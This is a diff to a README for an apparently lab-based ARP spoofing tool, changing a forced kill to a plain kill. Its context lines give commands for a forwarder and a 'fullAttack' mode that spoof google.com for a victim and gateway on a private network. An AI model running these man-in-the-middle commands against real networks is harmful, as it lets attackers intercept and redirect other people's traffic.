@@ -29,11 +29,11 @@ Clear ARP table: `sudo ip -s -s neigh flush all`
 
 ### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
 ### 1. Determine the PID of the process: sudo lsof -i :80
-### 2. Kill the process: sudo kill -9 <PID>
+### 2. Kill the process: sudo kill <PID>
 5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --siteToSpoof "google.com"`
 
 # Or Run the full attack at once:
 ### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
 ### 1. Determine the PID of the process: sudo lsof -i :80
-### 2. Kill the process: sudo kill -9 <PID>
+### 2. Kill the process: sudo kill <PID>
 1. `sudo python3 main.py --interface "enp0s10" fullAttack --ipVictim "10.0.123.5" --ipGateway "10.0.123.1" --siteToSpoof "google.com"`
